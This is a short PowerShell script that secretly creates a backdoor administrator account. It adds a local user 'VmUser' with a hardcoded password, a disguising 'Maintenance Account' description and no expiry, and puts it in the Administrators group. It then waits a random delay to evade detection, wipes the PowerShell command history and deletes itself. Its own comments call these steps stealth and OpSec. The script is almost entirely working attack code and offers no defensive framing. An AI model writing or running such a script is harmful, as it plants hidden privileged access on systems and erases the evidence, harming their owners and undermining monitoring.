# username and password
$user = "VmUser"
$pass = "HSTS765$#Hsjh"

# Creating the user using PowerShell for stealth
New-LocalUser -Name $user -Password (ConvertTo-SecureString $pass -AsPlainText -Force) -AccountNeverExpires -Description "Maintenance Account"

# Adding the user to the Administrators group
Add-LocalGroupMember -Group "Administrators" -Member $user

# Random delay to avoid pattern recognition
Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 300)

# Clean up traces of the script execution for OpSec
$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
if (Test-Path $historyPath) {
    Clear-Content -Path $historyPath
}

# Self-deletion of the script for OpSec
$myInvocation = (Get-Variable MyInvocation -Scope 1).Value
Remove-Item $myInvocation.MyCommand.Path
